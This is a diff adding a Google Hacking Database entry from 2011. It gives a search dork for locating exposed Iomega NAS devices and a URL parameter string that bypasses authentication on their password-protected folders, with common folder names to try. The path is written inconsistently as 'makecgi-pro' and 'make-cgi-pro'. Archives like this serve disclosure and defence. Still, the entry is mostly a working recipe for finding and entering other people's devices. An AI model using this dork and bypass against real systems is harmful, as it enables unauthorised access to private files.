@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3759
+Category:         Various Online Devices
+Published Date:   2011-12-12
+Author:           anonymous
+GoogleDork:       inurl:/cgi-bin/makecgi-pro
+Description:      inurl:/cgi-bin/makecgi-pro
+
+
+Brings up listings for Iomgea NAS devices. Password protected folders are susceptible to authentication bypass by adding the following to the url (after /cgi-bin/make-cgi-pro): ?page_value=page_files&amp;tab_value=%20&amp;task_value=task_gotoPath&amp;param1_value=(foldername) Common folders are music, movies, photos &amp; public. Author: Matt Jones
